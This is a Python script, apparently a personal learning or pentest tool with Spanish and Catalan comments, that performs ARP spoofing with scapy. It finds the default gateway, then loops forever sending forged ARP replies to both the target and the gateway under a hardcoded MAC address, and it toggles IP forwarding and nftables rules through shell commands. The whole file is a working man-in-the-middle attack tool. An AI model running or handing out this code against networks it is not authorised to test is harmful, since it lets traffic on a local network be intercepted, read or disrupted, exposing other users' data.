#!/usr/bin/env python3

import sys
import time
import signal
import argparse
import subprocess
import scapy.all as scapy
from colorama import Fore
from myUtils import show_message
from argparse import RawDescriptionHelpFormatter

### Variables & Constants #################################################################################################

SRC_IP = ""
SRC_MAC = "aa:bb:cc:44:55:66"
DST_MAC = "d4:d8:53:23:57:cb"

### Functions #############################################################################################################

def def_handler(sig, frame):
    print(f"\n{Fore.RED}[!] {Fore.YELLOW} Saliendo del programa...\n")
    disable_rules()
    sys.exit(1)

def get_arguments():
    
    parser = argparse.ArgumentParser(description = (f"""{Fore.WHITE}ARP Spoofer

    {Fore.RED}[!] {Fore.YELLOW}Important

    {Fore.YELLOW}[+] {Fore.MAGENTA}Initialization: {Fore.CYAN}To run this script, you must execute:
        {Fore.GREEN}sudo ./nftables.sh

    {Fore.YELLOW}[-] {Fore.MAGENTA}Reset: {Fore.CYAN}To restore normal network settings:
        {Fore.GREEN}sudo nft flush ruleset{Fore.RESET}"""),
    formatter_class=RawDescriptionHelpFormatter)

    parser.add_argument("-t", "--target", required=True, dest="target", help="Host o rango de red a escanear")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc=SRC_MAC)
    ether_packet = scapy.Ether(dst=DST_MAC) / arp_packet
    scapy.sendp(ether_packet, verbose=False)

def command_execute(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except:
        pass

def disable_rules():
    # Borra les regles de nftables
    command_execute("nft flush ruleset")
    # Deshabilita l'encaminament
    # Si el vols tenir activat sempre comenta les linies que fan referencia a l'encaminament
    command_execute("sysctl -w net.ipv4.ip_forward=0")

def get_gateway():
    result = subprocess.run("ip route show default", shell=True, capture_output=True, text=True)
    return result.stdout.split()[2]    

def init():
    # Permet el tallar el programa amb Ctrl + C
    signal.signal(signal.SIGINT, def_handler)
    show_message("Iniciando el programa:", "info", "Arp Spoof")
    
def main():
    
    try:

        init()
        arguments = get_arguments()
        SRC_IP = get_gateway()
        print(SRC_IP)

        # Per sortir del bucle es surt amb Ctrl + C
        while True: 
            spoof(arguments.target, SRC_IP)
            spoof(SRC_IP, arguments.target)
    
    except PermissionError:
         print(f"{Fore.RED}[!] {Fore.YELLOW}You need to be SuperUser to perform this script")
         sys.exit(1)

if __name__ == "__main__":
    main()
